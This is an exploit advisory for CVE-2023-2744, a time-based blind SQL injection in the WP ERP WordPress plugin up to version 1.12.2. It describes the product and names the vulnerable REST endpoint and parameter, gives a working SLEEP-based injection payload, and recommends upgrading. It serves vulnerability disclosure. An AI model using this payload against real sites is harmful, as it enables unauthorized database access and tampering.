# Exploit Title: WP Plugins WP ERP <= 1.12.2 - SQL Injection
# Date: 15-10-2023
# Exploit Author: Arvandy
# Software Link: https://wordpress.org/plugins/erp/
# Vendor Homepage: https://wperp.com/
# Version: 1.12.2
# Tested on: Windows, Linux
# CVE: CVE-2023-2744

# Product Description
WP ERP is the first full-fledged ERP (Enterprise Resource Planning) system through which you can simultaneously manage your WordPress site and business from a single platform. WP ERP aims to deliver all your enterprise business requirements with simplicity. With real-time reports and a better way to handle business data, make your operation better managed, away from errors, and prepare your company for the next leap. WP ERP has 3 core modules: HR, CRM, and Accounting, which together make a complete ERP system for any type of business.

# Vulnerability overview:
The WordPress Plugins WP ERP - Accounting module <= 1.12.2 is vulnerable to Blind SQL Injection (time-based) via the TYPE parameter on /wp-json/erp/v1/accounting/v1/people endpoint. This vulnerability could lead to unauthorized data access and modification.

# Proof of Concept:
Affected Endpoint: /wp-json/erp/v1/accounting/v1/people?type=
Affected Parameter: type
payload: customer') AND (SELECT 1 FROM (SELECT SLEEP(3))x) AND ('x'='x

# Recommendation
Upgrade to version 1.12.4
